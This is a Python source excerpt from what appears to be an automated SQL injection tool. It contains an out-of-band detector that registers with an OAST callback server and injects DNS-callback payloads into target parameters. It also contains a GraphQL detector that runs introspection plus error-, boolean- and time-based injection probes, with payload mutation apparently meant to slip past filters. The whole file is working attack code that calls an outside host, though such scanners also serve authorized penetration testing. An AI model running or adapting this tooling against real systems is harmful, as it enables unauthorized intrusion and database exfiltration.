class OOBDetector:
    def __init__(self,engine,config,server_url,api_token=""):
        self.engine=engine; self.config=config; self.server=server_url.rstrip("/")
        self.api_token=api_token; self.token="sqr"+"".join(random.choices(string.ascii_lowercase+string.digits,k=12))

    async def detect(self,method,url,data,data_fmt,param,original,tamper_chain,dbms_hint="")->Optional[DetectionResult]:
        LOG.info(f"OOB detection: param={param!r} server={self.server}")
        # FIX-OOB-PRECONFIG (CRITICAL): When --oob-domain is specified, the arg-
        # parsing code pre-sets config._oob_registered_domain to the user's full
        # callback domain (e.g. "aitlttgserrmsjibhyvo21byfocux597j.oast.fun") and
        # config._oob_server_session_id to its first label.  We must NOT call
        # /register in that case — doing so would create a brand-new OAST session
        # and overwrite the pre-configured values with the server-assigned domain,
        # making all DNS payloads and poll requests target the WRONG session.
        _preconfig_domain = getattr(self.config, "_oob_registered_domain", None)
        if _preconfig_domain:
            # Use user-specified domain — skip OAST registration entirely.
            domain = _preconfig_domain
            _server_session_id = getattr(
                self.config, "_oob_server_session_id",
                domain.split(".")[0] if "." in domain else domain
            )
            LOG.info(f"OOB using pre-configured domain={domain} (--oob-domain specified)")
        else:
            try:
                fp=await self.engine.send("GET",f"{self.server}/register",params={"id":self.token})
                # BUG-FIX-OOB-1: Validate fp and fp.body before json.loads()
                if not _validate_response(fp, func_name="OOBDetector.detect"):
                    domain="oast.pro"
                else:
                    try:
                        _body_bytes = _extract_body_safe(fp, func_name="OOBDetector.detect")
                        _body_str = _body_bytes.decode('utf-8', errors='replace') if isinstance(_body_bytes, bytes) else str(_body_bytes)
                        data_reg = json.loads(_body_str)
                        domain = data_reg.get("domain", "oast.pro")
                    except (json.JSONDecodeError, ValueError, AttributeError):
                        domain = "oast.pro"
            except Exception: domain="oast.pro"
            # BUG-OOB-DOMAIN-NOT-PERSISTED FIX: The registered OAST session domain
            # (e.g. "wybsgdfrnbpzqjmfocelnjfvzq8j6las2.oast.fun") was obtained here
            # but NEVER stored. All extraction code uses config.oob_server (the base
            # URL like "https://oast.pro"), strips to "oast.pro", and sends DNS queries
            # there — but the OAST server only listens at "*.sessionid.oast.fun".
            # Detection worked because it used the session domain locally.
            # Extraction always failed silently because it used the wrong domain.
            # Fix: persist both token and registered domain so extraction can use them.
            # BUG-OAST-SESSION-ID FIX: interact.sh assigns its OWN session ID as the
            # domain prefix, which may differ from our registration token.
            _server_session_id = domain.split(".")[0] if domain and "." in domain else ""
            try:
                self.config._oob_registered_domain = domain
                self.config._oob_registered_token = self.token  # our token (for auth)
                self.config._oob_server_session_id = _server_session_id  # server's id
            except Exception:
                pass
        self.domain = domain  # store on instance for use by exfiltrate()
        LOG.info(f"OOB token={self.token}.{domain} [persisted to config._oob_registered_domain]")
        dbms_list=[dbms_hint] if dbms_hint else list(OOB_PAYLOADS_MAP.keys())
        for dbms in dbms_list:
            for template in OOB_PAYLOADS_MAP.get(dbms,[]):
                payload=template.format(token=self.token,domain=domain,data_q="SELECT 1")
                value=original+payload
                try: await _send_injected(self.engine,method,url,data,data_fmt,param,value,tamper_chain)
                except Exception: continue
                interactions=await self._poll(timeout=12.0)
                if interactions:
                    # BUG-R4-1 FIX: OOB detection confirmed — stop all other probe loops.
                    # BUG-R4-CEV-OOB FIX (Req 4): Also fire _confirmed_event.
                    _SCAN_STOPPED[0] = True
                    _cev_oob = getattr(self.config, "_confirmed_event", None)
                    if _cev_oob and not _cev_oob.is_set():
                        _cev_oob.set()
                    # BUG-OOB-PCV-THRESH FIX (Req 3/6): OOB detections skip the normal
                    # PCV timing-threshold calibration path. Without setting
                    # _pcv_timing_threshold, Check B in _post_confirm_verify_locked uses
                    # config.time_sec * 0.75 (default 3750ms), which may mismatch the
                    # OOB interaction latency. Set a conservative 2000ms threshold so
                    # any subsequent cross-tech PCV has a sensible starting point.
                    if not getattr(self.config, '_pcv_timing_threshold', 0):
                        self.config._pcv_timing_threshold = 2000.0  # 2s conservative OOB threshold
                    return DetectionResult(param=param,technique="O",payload=payload,dbms=dbms,
                                           confidence=0.99,notes=f"oob_dns domain={domain}")
        return None

    async def _poll(self, timeout=12.0, require_token: bool = True) -> List[Dict]:
        """Poll OAST server for DNS interactions.

        BUG-OOB-POLL-HEALTH-CHECK FIX: OAST servers (interact.sh) make their
        own DNS verification probes to the registered domain after registration.
        E.g. the server queries "sessionid.oast.fun" to verify DNS routing.
        These appear in /poll as interactions, and the old code returned ALL
        interactions — so detection falsely confirmed based on the OAST server's
        OWN health check, not actual SQL injection.
        Fix: when require_token=True, only return interactions whose DNS full-id
        contains self.token (the injection token like "sqrXXXXXX"). Health check
        queries from the OAST server use the bare session domain without our token.
        """
        deadline = time.monotonic() + timeout
        h = {"Authorization": f"Bearer {self.api_token}"} if self.api_token else {}
        while time.monotonic() < deadline:
            try:
                # BUG-OAST-POLL-BOTH-IDS FIX: Different OAST server implementations
                # track sessions by different keys. Try both the client token (what we
                # sent at registration) and the server-assigned session ID (domain prefix).
                _server_sid = getattr(self.config, "_oob_server_session_id", "") or ""
                _ids_to_try = []
                if _server_sid and _server_sid != self.token:
                    _ids_to_try = [self.token, _server_sid]  # try client token first
                else:
                    _ids_to_try = [self.token]
                for _poll_id in _ids_to_try:
                    try:
                        fp = await self.engine.send("GET", f"{self.server}/poll",
                            params={"id": _poll_id, "secret": _poll_id}, headers=h)
                        if not _validate_response(fp, func_name="OOBDetector._poll"):
                            continue
                        _body_bytes = _extract_body_safe(fp, func_name="OOBDetector._poll")
                        _body_str = (_body_bytes.decode("utf-8", errors="replace")
                                     if isinstance(_body_bytes, bytes) else str(_body_bytes))
                        d = json.loads(_body_str)
                        if not d.get("data"):
                            continue
                        if not require_token:
                            return d["data"]
                        # Filter: only interactions containing our injection token.
                        # Health checks use the bare session domain (no token prefix).
                        _tok_interactions = []
                        for _itx in d["data"]:
                            # BUG-OOB-INTERACTION-STRING FIX: handle str items
                            if isinstance(_itx, str):
                                _fid = _itx
                            else:
                                _fid = (_itx.get("full-id") or _itx.get("unique-id") or
                                        _itx.get("subdomain") or _itx.get("hostname") or
                                        _itx.get("raw-request") or "")
                            if self.token.lower() in _fid.lower():
                                _tok_interactions.append(_itx)
                        if _tok_interactions:
                            return _tok_interactions
                    except (json.JSONDecodeError, ValueError):
                        pass
                    except Exception:
                        pass
            except Exception as _sqr_e:
                LOG.debug("Suppressed in _poll: %s", _sqr_e)
            await asyncio.sleep(2.0)
        return []


# 
# GRAPHQL INJECTION
# 

GQL_ERROR_PATTERNS=[r'"errors"\s*:\s*\[',r'"message"\s*:\s*"[^"]*sql',
                    r'"message"\s*:\s*"[^"]*syntax error',r'"message"\s*:\s*"[^"]*mysql',
                    r'"extensions"\s*.*"code"\s*:\s*"INTERNAL_SERVER_ERROR"']

class GraphQLDetector:
    def __init__(self,engine,config): self.engine=engine; self.config=config

    async def detect(self,url,body,var_name,original_val,tamper_chain)->Optional[DetectionResult]:
        LOG.info(f"GraphQL probe: var={var_name!r}")
        await self._introspect(url)
        r=await self._detect_error(url,body,var_name,original_val,tamper_chain); 
        if r: return r
        r=await self._detect_boolean(url,body,var_name,original_val,tamper_chain); 
        if r: return r
        return await self._detect_time(url,body,var_name,original_val,tamper_chain)

    async def _introspect(self,url):
        try:
            iq=json.dumps({"query":"{__schema{types{name kind fields{name}}}}"})
            fp=await self.engine.send("POST",url,json_body=json.loads(iq),
                                       headers={"Content-Type":"application/json"})
            if "__schema" in _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction"):
                LOG.info("GraphQL introspection exposed!")
        except Exception as _sqr_e:
            LOG.debug("Suppressed in _introspect: %s", _sqr_e)

    async def _send_var(self,url,body,var_name,value,tamper_chain)->ResponseFingerprint:
        if isinstance(value,str): value=TamperLib.apply_chain(value,tamper_chain)
        parsed=json.loads(body); vars_=parsed.get("variables") or {}
        vars_[var_name]=value; parsed["variables"]=vars_
        return await self.engine.send("POST",url,json_body=parsed,headers={"Content-Type":"application/json"})

    async def _baseline(self,url,body,var_name,original_val)->Dict:
        fp=await self._send_var(url,body,var_name,original_val,[])
        # FIX BUG #2: Validate fp before accessing attributes
        if fp is None:
            return {"mean_length":0,"std_length":0,"mean_words":0,
                    "std_words":0,"mean_timing":0,"std_timing":50,
                    "modal_status":200,"samples":[]}
        return {"mean_length":getattr(fp, 'content_length', 0),"std_length":0,
                "mean_words":getattr(fp, 'body_words', 0),
                "std_words":0,"mean_timing":getattr(fp, 'elapsed_ms', 0),"std_timing":50,
                "modal_status":getattr(fp, 'status_code', 200),"samples":[fp]}

    async def _detect_error(self,url,body,var_name,original_val,tamper_chain):
        # FP guard: get baseline response before testing payloads
        data_fmt = "json"     # FIX-GQL-DFMT: GraphQL uses JSON body
        original = str(original_val)  # FIX-GQL-ORIG: alias for exact_sent_payload
        _gql_err_base = await self._send_var(url,body,var_name,str(original_val),tamper_chain)
        _gql_err_base_body = _safe_decode_body(_gql_err_base) if _gql_err_base and hasattr(_gql_err_base,"body") and _gql_err_base.body else ""
        # BUG-2 FIX (Req 1): use DBMS-specific Error payloads from CERTIFIED_PAYLOAD_DATABASE only
        _gql_e_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
        _gql_e_list = [_gql_e_dbms] if _gql_e_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
        # FIX-R1/R2: _get_cascade_payloads merges ALL 10 CERTIFIED_PAYLOAD_DATABASE categories
        # (not a single 'Error' category). Req 2: all category payloads must flow through every
        # technique surface including GraphQL.  FIX-R6: mutate_all() applies all 20 mutation layers.
        # FIX-R9: await asyncio.sleep(0.001) between iterations yields the event loop to prevent
        # 100% CPU on 300+ payload × 6 DBMS = 1800+ iteration loops.
        # BUG-CPU-SLEEP0-GQL-FIX (Req 9): sleep(0) only yields without sleeping; on fast targets
        # it returns immediately and the GIL never truly releases. Use 1ms minimum real sleep.
        _gql_e_mutator = SQLMutationEngine(dbms=(_gql_e_list[0] if _gql_e_list else "MySQL"), surface=data_fmt or "url")
        for _ge_dbms in _gql_e_list:
            if _SCAN_STOPPED[0]: return None  # FIX-R4: stop outer DBMS loop immediately
            _gql_e_mutator = SQLMutationEngine(dbms=_ge_dbms, surface=data_fmt or "url")
            for payload in _get_cascade_payloads(_ge_dbms, 'E', self.config.level):
                if _SCAN_STOPPED[0]: return None  # FIX-R4: stop at every iteration
                await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield prevents CPU spinning on fast targets
                payload = _gql_e_mutator.mutate_all(payload, technique="E")  # FIX-R6: 20 mutation layers, correct technique
                val=str(original_val)+payload
                fp=await self._send_var(url,body,var_name,val,tamper_chain)
                resp=_safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
                for dbms,patterns in SQL_ERROR_PATTERNS.items():
                    for pat in patterns:
                        if re.search(pat,resp,re.I):
                            if _gql_err_base_body and re.search(pat, _gql_err_base_body, re.I):
                                continue  # pattern in baseline — FP
                            # BUG-GQL-ERROR-SINGLE-PROBE FIX: Was returning detection immediately
                            # from a single probe. GraphQL servers return SQL errors for invalid
                            # schema queries, schema validation failures, or type coercion errors
                            # that are unrelated to injection. A single match is insufficient.
                            # Fix: send confirmation probe — same payload must produce same error twice.
                            try:
                                _gql_conf_fp = await self._send_var(url, body, var_name,
                                    str(original_val) + payload, tamper_chain)
                                _gql_conf_resp = _safe_decode_body(_gql_conf_fp,
                                    encoding="utf-8", errors="replace", func_name="gql_error_confirm")
                                if not re.search(pat, _gql_conf_resp, re.I):
                                    continue  # not reproduced — transient/schema error
                            except Exception:
                                continue
                            # BUG-R4-1 FIX: stop all probe loops on confirmed detection
                            # BUG-R4-CEV-GQL-E FIX (Req 4): fire _confirmed_event.
                            _SCAN_STOPPED[0] = True
                            _cev_gql_e = getattr(self.config, "_confirmed_event", None)
                            if _cev_gql_e and not _cev_gql_e.is_set():
                                _cev_gql_e.set()
                            _det_ex = DetectionResult(param=var_name,technique="E",payload=payload,
                                                   dbms=_ge_dbms,confidence=0.92,notes="graphql_error confirmed=2/2")
                            try:
                                _det_ex.exact_sent_payload = DetectionResult.compute_exact_payload(
                                    original + payload, tamper_chain)
                            except Exception:
                                pass
                            return _det_ex
                for pat in GQL_ERROR_PATTERNS:
                    if re.search(pat,resp,re.I):
                        if _gql_err_base_body and re.search(pat, _gql_err_base_body, re.I):
                            continue  # pattern in baseline — FP
                        # BUG-GQL-ERROR-SINGLE-PROBE FIX (GQL_ERROR_PATTERNS path):
                        # Same issue — single probe match triggers detection immediately.
                        # GQL "errors" array appears for ANY invalid query, not just injection.
                        try:
                            _gql_conf_fp2 = await self._send_var(url, body, var_name,
                                str(original_val) + payload, tamper_chain)
                            _gql_conf_resp2 = _safe_decode_body(_gql_conf_fp2,
                                encoding="utf-8", errors="replace", func_name="gql_gqlerr_confirm")
                            if not re.search(pat, _gql_conf_resp2, re.I):
                                continue
                        except Exception:
                            continue
                        # BUG-R4-1 FIX: stop all probe loops on confirmed detection
                        # BUG-R4-CEV-GQL-E2 FIX (Req 4): fire _confirmed_event.
                        _SCAN_STOPPED[0] = True
                        _cev_gql_e2 = getattr(self.config, "_confirmed_event", None)
                        if _cev_gql_e2 and not _cev_gql_e2.is_set():
                            _cev_gql_e2.set()
                        _det_ex = DetectionResult(param=var_name,technique="E",payload=payload,
                                               dbms=_ge_dbms,confidence=0.85,notes=f"gql_error pat={pat!r} confirmed=2/2")
                        try:
                            _det_ex.exact_sent_payload = DetectionResult.compute_exact_payload(
                                original + payload, tamper_chain)
                        except Exception:
                            pass
                        return _det_ex

    async def _detect_boolean(self,url,body,var_name,original_val,tamper_chain):
        data_fmt = "json"     # FIX-GQL-DFMT: GraphQL uses JSON body
        original = str(original_val)  # FIX-GQL-ORIG: alias for exact_sent_payload
        base=await self._baseline(url,body,var_name,original_val)
        # BUG-2 FIX (Req 1): use DBMS-specific Boolean payloads from CERTIFIED_PAYLOAD_DATABASE only
        _gql_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
        _gql_dbms_list = [_gql_dbms] if _gql_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
        # FIX-R1/R2: _get_cascade_payloads gives ALL 10 CERTIFIED_PAYLOAD_DATABASE categories.
        # FIX-R3: Require second confirmation probe — single-probe bool is vulnerable to FP on dynamic
        # pages (CSRF tokens / A/B widgets cause page-size deltas on any input).
        # FIX-R6: mutate_all() applies all 20 mutation layers.
        # FIX-R9: asyncio.sleep(0) yields event loop — prevents CPU spike on 1800+ iteration loops.
        for _gbl_dbms in _gql_dbms_list:
            if _SCAN_STOPPED[0]: return None  # FIX-R4: stop outer DBMS loop
            _gbl_mutator = SQLMutationEngine(dbms=_gbl_dbms, surface=data_fmt or "url")
            for _gbl_p in _get_cascade_payloads(_gbl_dbms, 'B', self.config.level):
                if _SCAN_STOPPED[0]: return None  # FIX-R4: every iteration
                await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield
                true_sfx = _gbl_mutator.mutate_all(_gbl_p, technique="B")  # FIX-R6: 20 layers, correct technique
                try:
                    _mfp_gbl = TechniqueCascadeEngine._make_false_payload(true_sfx)
                    false_sfx = (_mfp_gbl if (_mfp_gbl and _mfp_gbl != true_sfx)
                                 else (true_sfx.replace("1=1","1=2")
                                               .replace("'a'='a'","'a'='b'")
                                               .replace("2=2","2=3")))
                except Exception:
                    false_sfx = (true_sfx.replace("1=1","1=2").replace("'a'='a'","'a'='b'").replace("2=2","2=3"))
                if true_sfx == false_sfx: continue
                tf=await self._send_var(url,body,var_name,str(original_val)+true_sfx,tamper_chain)
                ff=await self._send_var(url,body,var_name,str(original_val)+false_sfx,tamper_chain)
                ts=_sim_to_baseline(tf,base); fs=_sim_to_baseline(ff,base); delta=ts-fs
                # FIX-R3: raised thresholds + require second confirmation probe
                if ts>0.80 and delta>0.25:
                    tf2=await self._send_var(url,body,var_name,str(original_val)+true_sfx,tamper_chain)
                    ff2=await self._send_var(url,body,var_name,str(original_val)+false_sfx,tamper_chain)
                    ts2=_sim_to_baseline(tf2,base); fs2=_sim_to_baseline(ff2,base); delta2=ts2-fs2
                    if delta2>0.20:
                        # FIX-R4: stop all probe loops on confirmed boolean detection
                        # BUG-R4-CEV-GQL-B FIX (Req 4): fire _confirmed_event.
                        _SCAN_STOPPED[0] = True
                        _cev_gql_b = getattr(self.config, "_confirmed_event", None)
                        if _cev_gql_b and not _cev_gql_b.is_set():
                            _cev_gql_b.set()
                        _det_bx = DetectionResult(param=var_name,technique="B",payload=true_sfx,
                                               dbms=_gbl_dbms,confidence=min(1.0,0.68+delta),notes=f"gql_bool dbms={_gbl_dbms}")
                        try:
                            _det_bx.exact_sent_payload = DetectionResult.compute_exact_payload(
                                original + true_sfx, tamper_chain)
                        except Exception:
                            pass
                        return _det_bx
        return None

    async def _detect_time(self,url,body,var_name,original_val,tamper_chain):
        data_fmt = "json"     # FIX-GQL-DFMT: GraphQL uses JSON body
        original = str(original_val)  # FIX-GQL-ORIG: alias for exact_sent_payload
        t=self.config.time_sec
        base=await self._baseline(url,body,var_name,original_val)
        expected=base["mean_timing"]+t*1000*0.8
        # BUG-2 FIX (Req 1): use DBMS-specific Timebased payloads from CERTIFIED_PAYLOAD_DATABASE only
        _gql_t_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
        _gql_t_list = [_gql_t_dbms] if _gql_t_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
        # FIX-R1/R2: _get_cascade_payloads merges ALL 10 categories (Timebased-first).
        # FIX-R6: mutate_all() applies all 20 mutation layers to each payload.
        # FIX-R9: asyncio.sleep(0) yields event loop — prevents CPU spike.
        for _gt_dbms in _gql_t_list:
            if _SCAN_STOPPED[0]: return None  # FIX-R4: stop outer DBMS loop
            _gt_mutator = SQLMutationEngine(dbms=_gt_dbms, surface=data_fmt or "url")
            for _gt_payload in _get_cascade_payloads(_gt_dbms, 'T', self.config.level):
                if _SCAN_STOPPED[0]: return None  # FIX-R4: every iteration
                await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield
                _gt_payload = _gt_mutator.mutate_all(_gt_payload, technique="T")  # FIX-R6: 20 layers, correct technique
                fp=await self._send_var(url,body,var_name,str(original_val)+_gt_payload,tamper_chain)
                # BUG-GQL-TIMING-FP-NULL FIX: _send_var() can return None when engine.send()
                # fails (network error, timeout, connection refused). Accessing fp.elapsed_ms
                # on None raises AttributeError which propagates uncaught through detect() and
                # crashes the GraphQL timing detection path for ALL 5 DBMSes. The second probe
                # already has `if _gql_fp2 and ...` — mirror the same guard here.
                if fp and fp.elapsed_ms>=expected:
                    # Confirmation: repeat to exclude jitter
                    _gql_fp2 = await self._send_var(url,body,var_name,str(original_val)+_gt_payload,tamper_chain)
                    # BUG-GQL-TIMING-LOW-THRESHOLD FIX: Was base["mean_timing"] + t*0.5*1000
                    # (250ms for t=0.1s). CDN-cold responses (~400ms) always exceed this.
                    # Fix: raise confirmation to 0.80× (matches initial threshold) + clean probe.
                    _gql_confirm_thresh = base["mean_timing"] + t * 1000 * 0.80
                    if _gql_fp2 and _gql_fp2.elapsed_ms >= _gql_confirm_thresh:
                        # Clean probe: send original value (no sleep) — must be fast
                        try:
                            _gql_clean = await self._send_var(url, body, var_name,
                                str(original_val), tamper_chain)
                            _gql_clean_ms = _gql_clean.elapsed_ms if _gql_clean else 0
                            _gql_clean_ok = _gql_clean_ms < max(base["mean_timing"] * 2.5,
                                                                  base["mean_timing"] + 500)
                            if not _gql_clean_ok:
                                LOG.debug(f"[GQL-T] clean probe also slow ({_gql_clean_ms:.0f}ms) — CDN/WAF latency, not SLEEP")
                                continue
                        except Exception:
                            continue
                    if _gql_fp2 and _gql_fp2.elapsed_ms >= _gql_confirm_thresh:
                        # BUG-R4-1 FIX: stop all probe loops on confirmed timing detection
                        # BUG-R4-CEV-GQL-T FIX (Req 4): fire _confirmed_event.
                        _SCAN_STOPPED[0] = True
                        _cev_gql_t = getattr(self.config, "_confirmed_event", None)
                        if _cev_gql_t and not _cev_gql_t.is_set():
                            _cev_gql_t.set()
                        _det_tx = DetectionResult(param=var_name,technique="T",payload=_gt_payload,
                                               dbms=_gt_dbms,confidence=0.85,notes=f"gql_time elapsed={fp.elapsed_ms:.0f}ms confirm={_gql_fp2.elapsed_ms:.0f}ms")
                        try:
                            _det_tx.exact_sent_payload = DetectionResult.compute_exact_payload(
                                original + _gt_payload, tamper_chain)
                        except Exception:
                            pass
                        return _det_tx
        return None


